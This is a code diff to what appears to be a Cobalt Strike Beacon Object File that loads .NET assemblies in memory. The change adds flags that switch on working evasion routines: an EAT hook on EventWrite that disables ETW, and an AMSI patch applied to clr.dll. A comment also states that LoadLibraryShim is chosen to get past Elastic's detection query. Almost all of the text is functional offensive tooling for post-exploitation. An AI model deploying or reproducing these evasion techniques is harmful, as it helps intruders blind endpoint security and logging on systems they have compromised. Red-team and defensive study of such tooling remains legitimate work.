@@ -14,7 +14,7 @@ extern "C" {
 
 #pragma warning(disable : 4996)
 
-BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArguments, LPSTR* OutputBuffer, PULONG OutputLength, BOOL patchExitflag);
+BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArguments, LPSTR* OutputBuffer, PULONG OutputLength, BOOL patchExitflag, BOOL patchAmsiflag);
 BOOL FindVersion(void* assembly, int length);
 BOOL PatchAmsiScanBuffer(HMODULE hModule);
 DWORD EATHook(HMODULE mod, char* FN, VOID* HA, VOID** OA);
@@ -30,19 +30,24 @@ int go(char* args, ULONG length)
 	DWORD assemblyByteLen = (DWORD)BeaconDataInt(&parser);
 	LPCWSTR assemblyArguments = (wchar_t*)BeaconDataExtract(&parser, NULL);
 	BOOL patchExitflag = BeaconDataInt(&parser);
-    
+	BOOL patchAmsiflag = BeaconDataInt(&parser);
+	BOOL patchEtwflag = BeaconDataInt(&parser);
+
 	/* Allocate memory for output of .net assembly */
 	LPSTR OutputBuffer = (LPSTR)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 0x100000);
 	ULONG OutputLength = 0;
     
-    	/* Bypass ETW with EAT Hooking */
-    	HMODULE advapi = KERNEL32$LoadLibraryA("advapi32.dll");
-	PVOID originalFunc = (PVOID)KERNEL32$GetProcAddress(advapi, "EventWrite");
-	if (!EATHook(advapi, const_cast<char*>("EventWrite"), reinterpret_cast<VOID*>(&DummyFunction), reinterpret_cast<VOID**>(&originalFunc)))
-		return -1;
+	/* Bypass ETW with EAT Hooking */
+	if (patchEtwflag != 0) {
+		BeaconPrintf(CALLBACK_OUTPUT, "Patching ETW");
+		HMODULE advapi = KERNEL32$LoadLibraryA("advapi32.dll");
+		PVOID originalFunc = (PVOID)KERNEL32$GetProcAddress(advapi, "EventWrite");
+		if (!EATHook(advapi, const_cast<char*>("EventWrite"), reinterpret_cast<VOID*>(&DummyFunction), reinterpret_cast<VOID**>(&originalFunc)))
+			return -1;
+	}
     
 	/* Execute inline dotnet */
-	Executedotnet(assemblyBytes, assemblyByteLen, assemblyArguments, &OutputBuffer, &OutputLength, patchExitflag);
+	Executedotnet(assemblyBytes, assemblyByteLen, assemblyArguments, &OutputBuffer, &OutputLength, patchExitflag, patchAmsiflag);
 
 	/* Print results */
 	BeaconPrintf(CALLBACK_OUTPUT, "[*] Assembly Output [%lu bytes]:\n%s", OutputLength, OutputBuffer);
@@ -51,15 +56,15 @@ int go(char* args, ULONG length)
 	return 0;
 }
 
-BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArguments, LPSTR* OutputBuffer, ULONG* OutputLength, BOOL patchExitflag) // Heavily modified but credits to Maldev Academy and Anthemtotheego for the skeleton where I could then work on bypasses
+BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArguments, LPSTR* OutputBuffer, ULONG* OutputLength, BOOL patchExitflag, BOOL patchAmsiflag) // Heavily modified but credits to Maldev Academy and Anthemtotheego for the skeleton where I could then work on bypasses
 {
-    /* Debugging shenanigans
-    BeaconPrintf(CALLBACK_OUTPUT, "Assembly Bytes Address: 0x%p", AssemblyBytes);
-    BeaconPrintf(CALLBACK_OUTPUT, "Output Buffer Address: 0x%p", OutputBuffer);
-    BeaconPrintf(CALLBACK_OUTPUT, "OutputLength Address: 0x%p", OutputLength);
-    BeaconPrintf(CALLBACK_OUTPUT, "Output Length: %lu", *OutputLength);
-    BeaconPrintfW(CALLBACK_OUTPUT, L"Arguments: %s", wAssemblyArguments);
-	*/
+    // /* Debugging shenanigans
+    // BeaconPrintf(CALLBACK_OUTPUT, "Assembly Bytes Address: 0x%p", AssemblyBytes);
+    // BeaconPrintf(CALLBACK_OUTPUT, "Output Buffer Address: 0x%p", OutputBuffer);
+    // BeaconPrintf(CALLBACK_OUTPUT, "OutputLength Address: 0x%p", OutputLength);
+    // BeaconPrintf(CALLBACK_OUTPUT, "Output Length: %lu", *OutputLength);
+    // BeaconPrintfW(CALLBACK_OUTPUT, L"Arguments: %s", wAssemblyArguments);
+	// */
 	
 	// --------- Here we initialize the CLR ---------
 	HRESULT HResult = NULL;
@@ -92,9 +97,15 @@ BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArg
 	
     	HMODULE phModDll = NULL;
 	HRESULT hResult = MSCOREE$LoadLibraryShim(L"clr.dll", wVersion, NULL, &phModDll); // We LoadLibraryShim in order to have the callstack bypass Elastic's detection query. Once clr.dll is loaded, run GetInterface
-    
-    	if (!PatchAmsiScanBuffer(phModDll)) // Patch clr.dll to bypass amsi
-	    return FALSE;
+
+	if (patchAmsiflag != 0) {
+		BeaconPrintf(CALLBACK_OUTPUT, "Patching AMSI");
+		BOOL Patch = PatchAmsiScanBuffer(phModDll);
+		if (!Patch) {
+			BeaconPrintf(CALLBACK_OUTPUT, "Failed to patch AMSI");
+			return FALSE;
+		}
+	}
 
 	HResult = runtimeInfo->GetInterface(xCLSID_CorRuntimeHost, xIID_ICorRuntimeHost, (PVOID*)&runtimeHost); // This will load clr.dll if we didn't LoadLibraryShim
 	HResult = runtimeHost->Start();
